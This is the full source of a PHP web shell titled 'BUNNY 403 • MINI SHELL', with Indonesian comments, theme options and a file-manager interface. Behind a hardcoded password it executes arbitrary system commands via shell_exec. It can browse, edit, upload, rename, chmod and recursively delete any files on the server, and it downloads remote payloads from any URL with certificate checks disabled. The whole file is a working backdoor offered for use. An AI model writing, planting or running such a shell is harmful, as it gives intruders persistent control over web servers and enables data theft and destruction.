<?php
error_reporting(0);
session_start();

// Simple authentication (optional - bisa dihapus jika tidak diperlukan)
$password = "admin123"; // ganti password
if(isset($_POST['pass']) && $_POST['pass'] == $password) {
    $_SESSION['logged'] = true;
}

// Handle theme change
if(isset($_GET['theme'])) {
    $_SESSION['theme'] = $_GET['theme'];
}

// Default theme
$themes = [
    'dark' => [
        'bg' => '#1e1e1e',
        'panel' => '#252526',
        'text' => '#d4d4d4',
        'border' => '#333',
        'input' => '#3c3c3c',
        'dir' => '#4ec9b0',
        'accent' => '#007acc',
        'accent_hover' => '#005999',
        'msg_bg' => '#2d2d2d'
    ],
    'light' => [
        'bg' => '#f5f5f5',
        'panel' => '#ffffff',
        'text' => '#333333',
        'border' => '#dddddd',
        'input' => '#f0f0f0',
        'dir' => '#0066cc',
        'accent' => '#0066cc',
        'accent_hover' => '#004999',
        'msg_bg' => '#e8f4fd'
    ],
    'hacker' => [
        'bg' => '#0a0e0a',
        'panel' => '#0f130f',
        'text' => '#33ff33',
        'border' => '#1a4d1a',
        'input' => '#1a2a1a',
        'dir' => '#66ff66',
        'accent' => '#00cc00',
        'accent_hover' => '#009900',
        'msg_bg' => '#102310'
    ],
    'matrix' => [
        'bg' => '#000000',
        'panel' => '#0a0a0a',
        'text' => '#00ff00',
        'border' => '#003300',
        'input' => '#0a1a0a',
        'dir' => '#00ff99',
        'accent' => '#00ff00',
        'accent_hover' => '#00cc00',
        'msg_bg' => '#0a1f0a'
    ],
    'midnight' => [
        'bg' => '#0a0a1a',
        'panel' => '#1a1a2e',
        'text' => '#a0a0ff',
        'border' => '#2a2a4a',
        'input' => '#2a2a4a',
        'dir' => '#8a8aff',
        'accent' => '#5a5aff',
        'accent_hover' => '#4a4aff',
        'msg_bg' => '#1f1f3a'
    ],
    'dracula' => [
        'bg' => '#282a36',
        'panel' => '#44475a',
        'text' => '#f8f8f2',
        'border' => '#6272a4',
        'input' => '#44475a',
        'dir' => '#50fa7b',
        'accent' => '#ff79c6',
        'accent_hover' => '#ff92d0',
        'msg_bg' => '#383a59'
    ]
];

// Get current theme
$current_theme = isset($_SESSION['theme']) && isset($themes[$_SESSION['theme']]) ? $_SESSION['theme'] : 'dark';
$theme = $themes[$current_theme];

if(!isset($_SESSION['logged'])) {
    echo '<form method="POST">
        Password: <input type="password" name="pass">
        <input type="submit" value="Login">
    </form>';
    exit();
}

// Recursive delete function
function deleteRecursive($path) {
    if(is_file($path)) {
        return unlink($path);
    } elseif(is_dir($path)) {
        $files = array_diff(scandir($path), array('.', '..'));
        foreach($files as $file) {
            deleteRecursive($path . '/' . $file);
        }
        return rmdir($path);
    }
    return false;
}

// Remote Upload Function
function remoteUpload($url, $save_path) {
    // Initialize cURL
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 300); // 5 minutes timeout
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    
    // Get file content
    $data = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $content_type = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if($error) {
        return ['success' => false, 'message' => "cURL Error: $error"];
    }
    
    if($http_code != 200) {
        return ['success' => false, 'message' => "HTTP Error: $http_code"];
    }
    
    if(empty($data)) {
        return ['success' => false, 'message' => "File is empty or not accessible"];
    }
    
    // Save file
    if(file_put_contents($save_path, $data)) {
        $size = filesize($save_path);
        return ['success' => true, 'message' => "File downloaded successfully! Size: " . formatBytes($size)];
    } else {
        return ['success' => false, 'message' => "Failed to save file to disk"];
    }
}

// Format bytes helper
function formatBytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    return round($bytes / pow(1024, $pow), $precision) . ' ' . $units[$pow];
}

// Get current directory
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
chdir($current_dir);

// Handle actions
$msg = '';

// Create File
if(isset($_POST['create_file'])) {
    $file = $_POST['filename'];
    $content = $_POST['content'];
    if(file_put_contents($file, $content)) {
        $msg = "✅ File $file created successfully";
    }
}

// Create Directory
if(isset($_POST['create_dir'])) {
    $dir = $_POST['dirname'];
    if(mkdir($dir)) {
        $msg = "✅ Directory $dir created successfully";
    }
}

// Upload File
if(isset($_FILES['file'])) {
    $target = basename($_FILES['file']['name']);
    if(move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        $msg = "✅ File uploaded successfully";
    }
}

// Remote Upload
if(isset($_POST['remote_upload'])) {
    $remote_url = $_POST['remote_url'];
    $save_name = $_POST['save_name'];
    
    if(empty($remote_url)) {
        $msg = "❌ Please enter URL";
    } else {
        // If save name is empty, extract from URL
        if(empty($save_name)) {
            $save_name = basename(parse_url($remote_url, PHP_URL_PATH));
            if(empty($save_name)) {
                $save_name = 'downloaded_' . time() . '.bin';
            }
        }
        
        $result = remoteUpload($remote_url, $save_name);
        if($result['success']) {
            $msg = "✅ " . $result['message'];
        } else {
            $msg = "❌ " . $result['message'];
        }
    }
}

// Rename
if(isset($_POST['rename'])) {
    $old = $_POST['old'];
    $new = $_POST['new'];
    if(rename($old, $new)) {
        $msg = "✅ Renamed $old to $new";
    }
}

// Delete - NOW WITH RECURSIVE!
if(isset($_GET['delete'])) {
    $target = $_GET['delete'];
    $full_path = $current_dir . '/' . $target;
    
    if(deleteRecursive($full_path)) {
        $type = is_dir($full_path) ? 'directory' : 'file';
        $msg = "✅ Deleted $type: $target (including all contents if it was a directory)";
    } else {
        $msg = "❌ Failed to delete: $target";
    }
}

// Chmod
if(isset($_POST['chmod'])) {
    $file = $_POST['file'];
    $perm = octdec($_POST['perm']);
    if(chmod($file, $perm)) {
        $msg = "✅ Changed permission of $file to " . $_POST['perm'];
    }
}

// Execute command (optional)
if(isset($_POST['cmd'])) {
    $output = shell_exec($_POST['cmd'] . " 2>&1");
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>🐰 BUNNY 403 • MINI SHELL</title>
    <style>
        body { 
            font-family: monospace; 
            background: <?php echo $theme['bg']; ?>; 
            color: <?php echo $theme['text']; ?>; 
            margin: 20px; 
            transition: all 0.3s ease;
        }
        .container { max-width: 1200px; margin: auto; }
        .panel { 
            background: <?php echo $theme['panel']; ?>; 
            border: 1px solid <?php echo $theme['border']; ?>; 
            padding: 15px; 
            margin: 10px 0; 
            border-radius: 5px;
        }
        input, textarea, select { 
            background: <?php echo $theme['input']; ?>; 
            border: 1px solid <?php echo $theme['border']; ?>; 
            color: <?php echo $theme['text']; ?>; 
            padding: 8px; 
            margin: 5px; 
            border-radius: 3px;
        }
        input[type=submit] { 
            background: <?php echo $theme['accent']; ?>; 
            border: none; 
            padding: 8px 15px; 
            cursor: pointer; 
            color: <?php echo $theme['text']; ?>;
            font-weight: bold;
        }
        input[type=submit]:hover { background: <?php echo $theme['accent_hover']; ?>; }
        table { width: 100%; border-collapse: collapse; }
        td, th { 
            border: 1px solid <?php echo $theme['border']; ?>; 
            padding: 10px; 
            text-align: left; 
        }
        th { background: <?php echo $theme['input']; ?>; }
        .dir { color: <?php echo $theme['dir']; ?>; font-weight: bold; }
        .file { color: <?php echo $theme['text']; ?>; }
        .msg { 
            background: <?php echo $theme['msg_bg']; ?>; 
            padding: 10px; 
            border-left: 4px solid <?php echo $theme['accent']; ?>;
            border-radius: 3px;
        }
        .path-breadcrumb { 
            background: <?php echo $theme['panel']; ?>; 
            padding: 10px; 
            margin-bottom: 10px; 
            border-radius: 5px; 
            border: 1px solid <?php echo $theme['border']; ?>;
        }
        .path-breadcrumb a { 
            color: <?php echo $theme['dir']; ?>; 
            text-decoration: none; 
            margin-right: 5px; 
        }
        .path-breadcrumb a:hover { text-decoration: underline; }
        .path-breadcrumb .separator { color: <?php echo $theme['border']; ?>; margin: 0 5px; }
        .clickable-dir { cursor: pointer; color: <?php echo $theme['dir']; ?>; text-decoration: none; }
        .clickable-dir:hover { text-decoration: underline; }
        .file-link { color: <?php echo $theme['text']; ?>; text-decoration: none; cursor: pointer; }
        .file-link:hover { opacity: 0.8; }
        .action-link { 
            color: <?php echo $theme['text']; ?>; 
            text-decoration: none; 
            margin: 0 3px;
            opacity: 0.7;
        }
        .action-link:hover { opacity: 1; }
        .theme-selector {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 10px;
        }
        .theme-btn {
            padding: 8px 15px;
            border: 1px solid <?php echo $theme['border']; ?>;
            background: <?php echo $theme['input']; ?>;
            color: <?php echo $theme['text']; ?>;
            cursor: pointer;
            border-radius: 3px;
            text-decoration: none;
        }
        .theme-btn:hover, .theme-btn.active {
            background: <?php echo $theme['accent']; ?>;
            color: <?php echo $theme['text']; ?>;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .warning {
            color: #ff6b6b;
            font-size: 0.9em;
        }
        .delete-btn {
            color: #ff6b6b !important;
        }
        .remote-info {
            font-size: 0.9em;
            color: <?php echo $theme['dir']; ?>;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>🐰 BUNNY 403 • MINI SHELL</h2>
            
            <!-- Theme Selector -->
            <div class="theme-selector">
                <?php foreach(array_keys($themes) as $theme_name): ?>
                    <a href="?theme=<?php echo $theme_name; ?>" 
                       class="theme-btn <?php echo $current_theme == $theme_name ? 'active' : ''; ?>"
                       style="<?php echo $current_theme == $theme_name ? 'background: ' . $theme['accent'] . ';' : ''; ?>">
                        <?php echo ucfirst($theme_name); ?>
                    </a>
                <?php endforeach; ?>
            </div>
        </div>
        
        <!-- Breadcrumb Navigation -->
        <div class="path-breadcrumb">
            <strong>📍 Current Path:</strong> 
            <?php
            $path_parts = explode('/', trim($current_dir, '/'));
            $cumulative_path = '';
            
            // Root link
            echo '<a href="?dir=/" title="Root">/</a>';
            
            foreach($path_parts as $part) {
                if(empty($part)) continue;
                $cumulative_path .= '/' . $part;
                echo '<span class="separator">/</span>';
                echo '<a href="?dir=' . urlencode($cumulative_path) . '" title="' . htmlspecialchars($cumulative_path) . '">' . htmlspecialchars($part) . '</a>';
            }
            ?>
        </div>
        
        <?php if($msg) echo "<div class='msg'>$msg</div>"; ?>
        
        <!-- Quick Jump -->
        <div class="panel">
            <h3>🚀 Quick Jump to Directory</h3>
            <form method="GET" style="display: flex; gap: 5px;">
                <input type="text" name="dir" style="flex: 1;" placeholder="Enter full path..." value="<?php echo htmlspecialchars($current_dir); ?>">
                <input type="submit" value="Go">
            </form>
        </div>
        
        <!-- File Manager -->
        <div class="panel">
            <h3>📁 File Manager</h3>
            <p class="warning">⚠️ Delete can now delete a folder and all its contents directly!</p>
            <table>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Perms</th>
                    <th>Modified</th>
                    <th>Actions</th>
                </tr>
                
                <?php
                $files = scandir($current_dir);
                
                // Show parent directory link (if not root)
                if($current_dir != '/' && $current_dir != '.') {
                    $parent_dir = dirname($current_dir);
                    if(empty($parent_dir) || $parent_dir == '.') $parent_dir = '/';
                    ?>
                    <tr>
                        <td colspan="5">
                            <a href="?dir=<?php echo urlencode($parent_dir); ?>" class="dir">⬆️ [ Back to Parent Directory ]</a>
                        </td>
                    </tr>
                    <?php
                }
                
                foreach($files as $file) {
                    if($file == '.' || $file == '..') continue;
                    
                    $full_path = $current_dir . '/' . $file;
                    $is_dir = is_dir($full_path);
                    $size = $is_dir ? '-' : filesize($full_path);
                    $perms = substr(sprintf('%o', fileperms($full_path)), -4);
                    $modified = date("Y-m-d H:i", filemtime($full_path));
                    
                    // Format size
                    if(!$is_dir) {
                        $size = formatBytes($size);
                    }
                    
                    // Count items in directory for warning message
                    $item_count = '';
                    if($is_dir) {
                        $contents = array_diff(scandir($full_path), array('.', '..'));
                        $count = count($contents);
                        if($count > 0) {
                            $item_count = " ($count items inside)";
                        }
                    }
                    ?>
                    <tr>
                        <td>
                            <?php if($is_dir): ?>
                                <a href="?dir=<?php echo urlencode($full_path); ?>" class="dir" title="Click to open directory">
                                    📁 <?php echo htmlspecialchars($file); ?>/
                                </a>
                            <?php else: ?>
                                <span class="file-link" onclick="editFile('<?php echo htmlspecialchars($file); ?>')" title="Click to edit file">
                                    📄 <?php echo htmlspecialchars($file); ?>
                                </span>
                            <?php endif; ?>
                        </td>
                        <td><?php echo $size; ?></td>
                        <td><?php echo $perms; ?></td>
                        <td><?php echo $modified; ?></td>
                        <td>
                            <a href="#" onclick="renameFile('<?php echo htmlspecialchars($file); ?>')" class="action-link" title="Rename">✏️</a>
                            
                            <!-- Delete with recursive confirmation -->
                            <?php if($is_dir): ?>
                                <a href="#" onclick="confirmDeleteDir('<?php echo htmlspecialchars($file); ?>', '<?php echo addslashes($item_count); ?>')" class="action-link delete-btn" title="Delete Directory (including all contents)">
                                    🗑️⚠️
                                </a>
                            <?php else: ?>
                                <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($file); ?>" 
                                   onclick="return confirm('Delete file: <?php echo htmlspecialchars($file); ?>?')" 
                                   class="action-link delete-btn" title="Delete File">
                                    🗑️
                                </a>
                            <?php endif; ?>
                            
                            <?php if(!$is_dir): ?>
                                <a href="#" onclick="editFile('<?php echo htmlspecialchars($file); ?>')" class="action-link" title="Edit">📝</a>
                                <a href="#" onclick="chmodFile('<?php echo htmlspecialchars($file); ?>')" class="action-link" title="Chmod">🔒</a>
                            <?php else: ?>
                                <a href="?dir=<?php echo urlencode($full_path); ?>" class="action-link" title="Open">📂</a>
                            <?php endif; ?>
                        </td>
                    </tr>
                <?php } ?>
            </table>
        </div>
        
        <!-- Remote Upload - FITUR BARU! -->
        <div class="panel">
            <h3>🌐 Remote Upload (Download from URL)</h3>
            <form method="POST">
                <input type="url" name="remote_url" placeholder="https://example.com/file.zip" style="width: 500px;" required>
                <br>
                <input type="text" name="save_name" placeholder="Save as (optional - kosongin biar auto detect)" style="width: 300px;">
                <br>
                <input type="submit" name="remote_upload" value="🌐 Download & Save">
            </form>
            <div class="remote-info">
                💡 Tips: 
                - Bisa download file dari URL manapun
                - Kosongin "Save as" untuk auto-detect nama file dari URL
                - Support file besar (timeout 5 menit)
                - Support HTTPS/SSL
            </div>
        </div>
        
        <!-- Create File -->
        <div class="panel">
            <h3>📝 Create/Edit File</h3>
            <form method="POST">
                <input type="text" name="filename" placeholder="filename.php" id="filename" style="width: 300px;">
                <br>
                <textarea name="content" rows="10" cols="80" id="content" style="width: 100%; background: <?php echo $theme['input']; ?>; color: <?php echo $theme['text']; ?>;"></textarea>
                <br>
                <input type="submit" name="create_file" value="💾 Save File">
            </form>
        </div>
        
        <!-- Create Directory -->
        <div class="panel">
            <h3>📁 Create Directory</h3>
            <form method="POST">
                <input type="text" name="dirname" placeholder="new_directory" style="width: 300px;">
                <input type="submit" name="create_dir" value="➕ Create">
            </form>
        </div>
        
        <!-- Upload File -->
        <div class="panel">
            <h3>📤 Upload File (Local)</h3>
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="file">
                <input type="submit" value="📤 Upload">
            </form>
        </div>
        
        <!-- Rename -->
        <div class="panel">
            <h3>✏️ Rename</h3>
            <form method="POST">
                <input type="text" name="old" placeholder="old_name" id="oldname" style="width: 300px;">
                <input type="text" name="new" placeholder="new_name" id="newname" style="width: 300px;">
                <input type="submit" name="rename" value="✏️ Rename">
            </form>
        </div>
        
        <!-- Chmod -->
        <div class="panel">
            <h3>🔒 Chmod</h3>
            <form method="POST">
                <input type="text" name="file" placeholder="filename" id="chmodfile" style="width: 300px;">
                <input type="text" name="perm" placeholder="755" value="644" style="width: 100px;">
                <input type="submit" name="chmod" value="🔒 Change">
            </form>
        </div>
        
        <!-- Command Execution -->
        <div class="panel">
            <h3>💻 Command Execution</h3>
            <form method="POST">
                <input type="text" name="cmd" style="width: 500px;" placeholder="ls -la">
                <input type="submit" value="⚡ Execute">
            </form>
            <?php if(isset($output)): ?>
                <pre style="background: <?php echo $theme['input']; ?>; padding: 10px; overflow-x: auto; border-radius: 3px;"><?php echo htmlspecialchars($output); ?></pre>
            <?php endif; ?>
        </div>
    </div>
    
    <script>
        function editFile(filename) {
            document.getElementById('filename').value = filename;
            document.getElementById('content').focus();
        }
        
        function renameFile(filename) {
            document.getElementById('oldname').value = filename;
            document.getElementById('newname').value = filename;
            document.getElementById('newname').focus();
        }
        
        function chmodFile(filename) {
            document.getElementById('chmodfile').value = filename;
        }
        
        function confirmDeleteDir(dirname, itemCount) {
            let message = `⚠️ WARNING! ⚠️\n\n`;
            message += `You will delete the FOLDER: ${dirname}\n`;
            if(itemCount) {
                message += `This folder has ${itemCount}\n`;
            }
            message += `\n⚠️ ALL contents of this folder WILL BE PERMANENTLY DELETED!\n`;
            message += `⚠️ NON-REFUNDABLE!\n\n`;
            message += `Are you sure you want to continue?`;
            
            if(confirm(message)) {
                window.location = '?dir=<?php echo urlencode($current_dir); ?>&delete=' + encodeURIComponent(dirname);
            }
        }
    </script>
</body>
</html>